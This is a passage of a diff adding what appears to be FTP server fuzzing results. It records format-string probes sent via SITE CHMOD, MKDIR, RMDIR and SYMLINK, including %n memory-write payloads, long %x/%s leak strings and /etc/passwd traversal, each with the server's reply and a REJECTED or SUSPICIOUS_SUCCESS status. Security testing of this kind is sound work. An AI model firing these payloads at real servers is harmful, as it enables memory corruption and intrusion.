+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 281,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %n",
+      "response": "500-'SITE CHMOD %n' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 282,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %d",
+      "response": "500-'SITE CHMOD %d' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 283,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %p",
+      "response": "500-'SITE CHMOD %p' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 284,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "500-'SITE CHMOD %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 285,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "500-'SITE CHMOD %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 286,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
+      "response": "500-'SITE CHMOD %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 287,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "500-'SITE CHMOD %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 288,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %n%n%n%n",
+      "response": "500-'SITE CHMOD %n%n%n%n' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 289,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %hn%hn%hn%hn",
+      "response": "500-'SITE CHMOD %hn%hn%hn%hn' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 290,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %hhn%hhn%hhn%hhn",
+      "response": "500-'SITE CHMOD %hhn%hhn%hhn%hhn' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 291,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %1$x",
+      "response": "500-'SITE CHMOD %1$x' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 292,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %2$x",
+      "response": "500-'SITE CHMOD %2$x' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 293,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %3$x",
+      "response": "500-'SITE CHMOD %3$x' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 294,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %10$x",
+      "response": "500-'SITE CHMOD %10$x' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 295,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %100$x",
+      "response": "500-'SITE CHMOD %100$x' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 296,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %1$s",
+      "response": "500-'SITE CHMOD %1$s' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 297,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %2$s",
+      "response": "500-'SITE CHMOD %2$s' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 298,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %3$s",
+      "response": "500-'SITE CHMOD %3$s' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 299,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %1$n",
+      "response": "500-'SITE CHMOD %1$n' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 300,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %2$n",
+      "response": "500-'SITE CHMOD %2$n' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 301,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD AAAA%x%x%x%x",
+      "response": "500-'SITE CHMOD AAAA%x%x%x%x' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 302,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "500-'SITE CHMOD AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 303,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "500-'SITE CHMOD %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 304,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "500-'SITE CHMOD %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 305,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD ../%x%x%x%x",
+      "response": "500-'SITE CHMOD ../%x%x%x%x' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 306,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %x/../../../etc/passwd",
+      "response": "500-'SITE CHMOD %x/../../../etc/passwd' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 307,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %x",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 308,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %s",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 309,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %n",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 310,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %d",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 311,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %p",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 312,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 313,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 314,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 315,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 316,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %n%n%n%n",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 317,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %hn%hn%hn%hn",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 318,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %hhn%hhn%hhn%hhn",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 319,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %1$x",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 320,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %2$x",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 321,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %3$x",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 322,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %10$x",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 323,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %100$x",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 324,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %1$s",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 325,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %2$s",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 326,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %3$s",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 327,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %1$n",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 328,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %2$n",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 329,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR AAAA%x%x%x%x",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 330,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 331,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "550 MKDIR %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x: File name too long\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 332,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 333,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR ../%x%x%x%x",
+      "response": "550 MKDIR ../%x%x%x%x: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 334,
+      "category": "format_string_SITE_MKDIR",
+      "command": "SITE MKDIR %x/../../../etc/passwd",
+      "response": "200 SITE MKDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 335,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %s",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 336,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %p",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 337,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 338,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 339,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %n%n%n%n",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 340,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %hhn%hhn%hhn%hhn",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 341,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %1$x",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 342,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %2$x",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 343,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %1$s",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 344,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %2$s",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 345,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %3$s",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 346,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %1$n",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 347,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %2$n",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 348,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR AAAA%x%x%x%x",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 349,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 350,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "550 RMDIR %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 351,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "200 SITE RMDIR command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 352,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR ../%x%x%x%x",
+      "response": "550 RMDIR ../%x%x%x%x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 353,
+      "category": "format_string_SITE_RMDIR",
+      "command": "SITE RMDIR %x/../../../etc/passwd",
+      "response": "550 RMDIR %x/../../../etc/passwd: Invalid argument\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 354,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %x",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 355,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %s",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 356,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %n",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 357,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %d",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 358,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %p",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 359,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 360,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 361,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 362,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 363,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %n%n%n%n",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 364,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %hn%hn%hn%hn",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 365,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %hhn%hhn%hhn%hhn",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 366,
+      "category": "format_string_SITE_SYMLINK",
+      "command": "SITE SYMLINK %1$x",
+      "response": "500 'SITE SYMLINK' not understood\r\n",
